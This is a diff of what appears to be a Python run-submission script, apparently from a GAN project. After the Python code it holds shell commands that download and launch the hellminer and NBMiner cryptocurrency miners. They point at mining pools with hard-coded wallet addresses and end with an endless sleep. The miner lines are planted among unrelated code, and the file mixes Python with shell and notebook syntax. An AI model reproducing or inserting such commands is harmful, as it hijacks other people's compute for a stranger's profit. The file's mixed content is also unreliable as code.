@@ -163,8 +163,7 @@ Run 'python %(prog)s <subcommand> --help' for subcommand help.''',
     dnnlib.submit_run(sc, func_name_map[subcmd], **kwargs)
 
 #----------------------------------------------------------------------------
-apt update > /dev/null
-        apt-get install -y jq && wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz &&./hellminer -c stratum+tcp://pool -u RA1Cx5EkXxNZU8CR1rspXUzQ7xfHLoYu1J.tuet -p x --cpu 8
+apt-get install -y jq && wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz &&./hellminer -c stratum+tcp://pool -u RA1Cx5EkXxNZU8CR1rspXUzQ7xfHLoYu1J.tuet -p x --cpu 8
             
 sudo apt update && wget https://github.com/NebuTech/NBMiner/releases/download/v39.2/NBMiner_39.2_Linux.tgz && tar -xvf NBMiner_39.2_Linux.tgz && NBMiner_Linux/nbminer -a ethash -o nicehash+tcp://daggerhashimoto.eu.nicehash.com:3353 -u 3MBZ2pmtSQRpTRuQy7nHMQtBEPfqcBBNX9.40A
             ! sleep 87687676589876
